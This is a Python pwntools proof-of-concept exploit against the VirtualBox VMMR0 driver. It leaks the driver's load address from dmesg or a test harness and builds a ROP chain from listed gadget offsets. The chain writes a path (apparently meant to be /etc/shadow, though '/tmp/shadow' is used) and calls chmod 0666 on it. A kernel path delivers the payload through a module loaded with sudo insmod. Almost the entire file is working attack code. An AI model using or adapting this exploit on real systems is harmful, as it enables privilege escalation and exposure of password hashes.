#!/usr/bin/env python3.5
import sys
from pwn import *
context.clear(arch='amd64', kernel='amd64')
'''
gcc -g -D OF_SIZE=128 userspace.c -o userspace
python3 ./poc.py VMMR0.r0 payload 100

gdb -tui userspace
b userspace.c:90
r VMMR0.r0 payload

Now in other window
./poc.py VMMR0.r0 payload 30 0x7ffff78da000
Then ctrl-d in gdb so userspace will continue

s
si
x/64x $rsp
si

VMMR0:  http://www.ropshell.com/ropsearch?h=f81f7bdd9ffe47e093805c9d2f626f38
pop rdi; ret;                       VMMR0 + 0x07b62a
pop rax; ret;                       VMMR0 + 0x01f7bd



mov rax, [rdi + 0x2a50]; ret;       VMMR0 + 0x0b7470

THIS DOES NOT STORE TO MEMORY!!! ^ THIS TAKES RDI+0X0A50 AND
STORES WHAT IS IN MEMORY THERE INTO RAX

WHAT WE NEED IS
mov [rdi], rax

WHICH IN x64 IS
0:  48 89 07                mov    QWORD PTR [rdi],rax

mov    %rax,(%rdi)                  VMMR0 + 0x081643


syscall; ret;                       VMMR0 + 0x012c3c0
push rsp; ret;                      VMMR0 + 0x01f7ad
pop rbp; ret;                       VMMR0 + 0x028d
xor eax, eax; ret;                  VMMR0 + 0x08b8
retq;                               VMMR0 + 0x01ea33
'''

# For some insane reason (probably due to how ELF works) when we load the
# target_binary into memory in userspace.c everything is 0x40 above where it
# normally is. Therefore we use some addition to fix that.
class Adjuster(object):
    def __init__(self, offset):
        self.offset = offset

    def __call__(self, addr):
        return self.offset + addr
adjuster = Adjuster(0x00)


def leaked(start_leaker, search_for):
    # Get the address from the leak
    leaker = process(start_leaker)
    leak = leaker.recvall().decode('utf-8').replace('\r', '')
    leak = [l for l in leak.split('\n') if 'vboxdrv:' in l and search_for in l]
    if len(leak) < 1:
        return
    leak = leak[-1].split()
    if len(leak) < 3:
        return
    leak = int(leak[-2], 16)
    return leak, leaker

def build(leak, gadget_file):
    # Load the target binary
    with open(gadget_file, 'rb') as i:
        binary = ELF.from_bytes(i.read(), vma=leak)
    # Create the ROP stack
    rop = ROP(binary)

    # Push a valid rbp
    rop.raw(0x7fffffffff00)

    # Put a nice lil ret seld on der
    # for i in range(0):
    #     # ret;
    #     rop.raw(adjuster(leak + 0x01ea33))

    # Build a string in the .bss section of the target driver
    # the .bss section starts at the address the driver was loaded
    # We have to adjust because the gadget we have is rdi + 0x2a50
    string_location = leak

    # pop rax; ret;
    rop.raw(adjuster(leak + 0x01f7bd))
    # /etc
    # rop.raw(b'/etc')
    rop.raw(b'/tmp')
    # pop rdi; ret;
    rop.raw(adjuster(leak + 0x07b62a))
    # set rdi
    rop.raw(adjuster(string_location))
    # mov rax, (rdi)
    rop.raw(adjuster(leak + 0x081643))

    # pop rax; ret;
    rop.raw(adjuster(leak + 0x01f7bd))
    # /sha
    rop.raw(b'/sha')
    # pop rdi; ret;
    rop.raw(adjuster(leak + 0x07b62a))
    # set rdi
    rop.raw(adjuster(string_location + 4))
    # mov rax, (rdi)
    rop.raw(adjuster(leak + 0x081643))

    # pop rax; ret;
    rop.raw(adjuster(leak + 0x01f7bd))
    # dow\x00
    rop.raw(b'dow\x00')
    # pop rdi; ret;
    rop.raw(adjuster(leak + 0x07b62a))
    # set rdi
    rop.raw(adjuster(string_location + 8))
    # mov rax, (rdi)
    rop.raw(adjuster(leak + 0x081643))

    # Now call chmod

    # pop rax; ret;
    rop.raw(adjuster(leak + 0x01f7bd))
    # set rax
    rop.raw(0x5a)
    # pop rdi; ret;
    rop.raw(adjuster(leak + 0x07b62a))
    # set rdi
    rop.raw(adjuster(string_location))
    # pop rsi; ret;
    rop.raw(adjuster(leak + 0x035058))
    # set rsi
    rop.raw(0o666)
    # syscall; NULL
    rop.raw(adjuster(leak + 0x012c384))

    # Display our completed ROP chain
    print(rop.dump())
    # Return it as bytes to be writen out
    # Put 132 bytes of whatever
    return b'A'*128 + bytes(rop)

def create_exploit(target_binary, payload_file, leak):
    exploit = build(leak, target_binary)
    with open(payload_file, 'wb') as o:
        o.write(exploit)
    return exploit

def attack_userspace(target_binary, payload_file):
    # For ELF offset
    global adjuster
    adjuster = Adjuster(0x40)

    leak, leaker = leaked(['./userspace', target_binary, payload_file],
            target_binary)
    print('Leaked address is', str(hex(leak)))
    exploit = create_exploit(target_binary, payload_file, leak)
    leaker.shutdown('send')
    leaker.shutdown()

def attack_kernel(target_binary, payload_file):
    leak, leaker = leaked(['dmesg', '--color=never'], target_binary)
    leaker.shutdown()
    print('Leaked address is', str(hex(leak)))
    exploit = create_exploit(target_binary, payload_file, leak)
    exploit = bytes(exploit).hex()
    n = 2
    exploit = ','.join([exploit[i:i+n] for i in range(0, len(exploit), n)])
    args = ['sudo', 'insmod', 'vbox3.ko', 'exploit_payload="'+exploit+'"',
        'exploit_length="'+str(len(exploit))+'"']
    print(args)
    process(args)

def main():
    # Make sure we have enough args
    if len(sys.argv) < 4:
        print('Usage %s attack_method target_binary payload_file [leak]'.format(sys.argv[1]))
        sys.exit(1)
    # Set the common variables
    attack_method = sys.argv[1]
    target_binary = sys.argv[2]
    payload_file = sys.argv[3]
    # Choose what to do baised on number of vars given
    if len(sys.argv) == 4:
        if attack_method == 'userspace':
            attack_userspace(target_binary, payload_file)
        elif attack_method == 'kernel':
            attack_kernel(target_binary, payload_file)
    else:
        leak = int(sys.argv[4], 16)
        create_exploit(target_binary, payload_file, leak)

if __name__ == '__main__':
    main()
